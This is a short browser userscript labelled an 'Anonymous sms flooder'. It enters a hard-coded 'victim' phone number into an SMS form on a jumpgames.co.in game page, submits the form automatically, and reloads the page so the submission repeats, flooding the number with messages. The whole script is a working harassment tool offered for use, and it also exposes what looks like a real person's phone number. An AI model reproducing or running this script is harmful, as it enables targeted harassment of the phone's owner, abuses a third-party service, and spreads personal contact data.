// ==UserScript==
// @name          Anonymous CARTOONNETWORKINDIA.COM sms flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*cartoonnetworkindia.com/*
// ==/UserScript==

var victim=8092277167; //Enter victims number here


if(document.location=="http://www.jumpgames.co.in/gamepage/game_page_new.php?productid=127"||document.location=="http://www.jumpgames.co.in/gamepage/game_page_new.php?productid=127")
{
document.getElementsByName("mobilenum_abt")[0].value=victim;
document.forms[0].submit();
}


if(document.location=="http://www.jumpgames.co.in/gamepage/game_page_new.php?productid=127")
document.location="http://www.jumpgames.co.in/gamepage/game_page_new.php?productid=127"
